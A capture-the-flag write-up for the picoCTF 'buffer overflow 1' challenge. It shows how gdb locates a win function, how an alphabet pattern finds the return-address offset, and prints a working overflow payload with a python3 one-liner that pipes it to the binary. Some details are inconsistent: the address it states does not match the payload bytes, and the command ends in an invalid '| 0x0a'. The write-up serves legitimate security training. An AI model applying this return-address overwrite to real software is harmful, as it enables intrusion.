# buffer overflow 1

## Description
Control the return address  
Now we're cooking! You can overflow the buffer and return to the flag function in the program. You can view source here. And connect with it using ```nc saturn.picoctf.net 50265```

## Challenge Information
**Point Value:** 100  
**Category:** Binary Exploitation

## Hints
1. Make sure you consider big Endian vs small Endian.
2. Changing the address of the return pointer can call different functions.

## Solution
We have a C program, and we have a win function in that program. We use ```$ gdb vuln``` and then ```(gdb) disassemble win``` to find the address of the win function which is 0x491f6. We do the alphabet technique again, but when we enter the alphabet, we get no error. Let's try entering two alphabets, and we get the return address 0x76757473. This converts to 'stuv' in ASCII, but we need to use little endian form. So we can subtract that from our input string, and to jump to the win function, we can just put its address at the end of the input string (in little endian). So our input string looks like this, 
```"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqr\xf6\x91\x04\x08"```
```sh
python3 -c "import sys; sys.stdout.buffer.write(b'abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqr\xf6\x91\x04\x08')" | ./vuln | 0x0a
```
